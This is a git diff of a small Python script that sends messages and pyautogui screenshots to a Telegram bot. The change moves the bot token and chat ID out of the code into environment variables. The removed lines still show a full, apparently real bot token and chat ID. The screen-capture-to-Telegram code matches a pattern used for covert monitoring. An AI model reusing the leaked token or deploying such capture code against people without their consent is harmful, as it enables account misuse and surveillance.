@@ -1,10 +1,16 @@
+from dotenv import load_dotenv
+
 import requests
 import io
 import pyautogui
-from PIL import Image
+import os
 
-TOKEN = "7423490445:AAGN3zK7N97YsfEHzqY6aRuIjV5rwO0Ewf0"
-CHAT_ID = "1559668342"
+# Load environment variables from .env
+load_dotenv()
+
+# Now get the values
+TOKEN = os.getenv("TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 def sendMessage(MESSAGE):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -27,8 +33,3 @@ def sendScreenshot():
     data = {'chat_id': CHAT_ID}
 
     response = requests.post(url, files=files, data=data)
-    # if response.status_code == 200:
-    #     print("📸 Screenshot sent!")
-    # else:
-    #     print("❌ Failed to send screenshot:", response.text)
-    
